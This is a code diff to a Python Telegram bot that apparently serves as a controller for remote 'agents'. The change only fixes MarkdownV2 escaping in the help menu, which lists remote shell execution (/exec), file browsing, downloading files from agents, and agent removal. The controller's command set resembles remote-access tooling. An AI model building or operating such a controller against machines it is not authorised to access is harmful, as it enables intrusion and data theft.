@@ -1,5 +1,5 @@
 # api/index.py
-# FINAL VERSION - With all commands and security features
+# FINAL VERSION v2 - Corrected all MarkdownV2 formatting errors.
 
 import os
 import re
@@ -69,16 +69,15 @@ async def post_job(target_id, command, args):
 
 # --- Telegram Command Handlers ---
 async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Displays the help menu with corrected and organized Markdown."""
+    """Displays the help menu with corrected Markdown."""
+    # --- MODIFIED: Corrected all MarkdownV2 special characters ---
     help_text = (
         "*AGENT CONTROLLER HELP MENU*\n\n"
         "Use these commands to manage and control your agents\\.\n\n"
-        "--------------------------------------\n"
         "*🎯 CORE COMMANDS*\n"
         "`/list` \\- Show all active agents\n"
         "`/target <id|all|clear>` \\- Set the active agent\n"
         "`/help` \\- Display this help menu\n\n"
-        "--------------------------------------\n"
         "*💻 SYSTEM & INFO*\n"
         "`/info` \\- Get detailed system information\n"
         "`/exec <command>` \\- Execute a shell command\n\n"
@@ -99,7 +98,6 @@ async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "`/cd <directory>` \\- Change directory\n"
         "`/pwd` \\- Show current directory\n"
         "`/download <file>` \\- Download a file from the agent\n\n"
-        "--------------------------------------\n"
         "*💣 DESTRUCTIVE COMMANDS*\n"
         "`/destroy <id> CONFIRM` \\- Uninstall and remove the agent\n"
     )
